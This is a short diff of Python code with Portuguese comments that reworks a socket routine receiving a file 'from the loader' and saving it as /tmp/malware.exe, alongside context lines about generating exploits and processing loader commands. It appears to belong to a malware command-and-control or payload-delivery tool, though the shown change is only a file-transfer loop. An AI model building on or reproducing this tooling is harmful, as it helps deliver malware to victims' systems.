@@ -90,29 +90,29 @@ s.close()
     return f"Exploit gerado: {nome}"
 
 def recebe_ficheiro(conn):
-    # recebe ficheiro enviado pelo loader
+    # recebe o tamanho do ficheiro
     try:
-        conn.send(b"OK_READY")
-        tamanho = int(conn.recv(1024).decode())
-        conn.send(b"OK_SIZE")
+        tamanho = conn.recv(1024).decode()
+        tamanho = int(tamanho.strip())
+        conn.send(b"OK")
         
-        caminho = f"/tmp/malware_recebido_{int(time.time())}.exe"
-        dados_recebidos = 0
+        caminho = "/tmp/malware.exe"
+        f = open(caminho, "wb")
         
-        with open(caminho, "wb") as f:
-            while dados_recebidos < tamanho:
-                dados = conn.recv(4096)
-                if not dados:
-                    break
-                f.write(dados)
-                dados_recebidos += len(dados)
+        recebido = 0
+        while recebido < tamanho:
+            dados = conn.recv(4096)
+            if not dados:
+                break
+            f.write(dados)
+            recebido += len(dados)
         
-       
-        conn.recv(1024)
+        f.close()
+        conn.recv(1024)  # espera o FIM
         
         return caminho
     except Exception as e:
-        return f"ERRO: {str(e)}"
+        return "ERRO: " + str(e)
 
 def processa(comando, conn=None):
     # processa comandos do loader
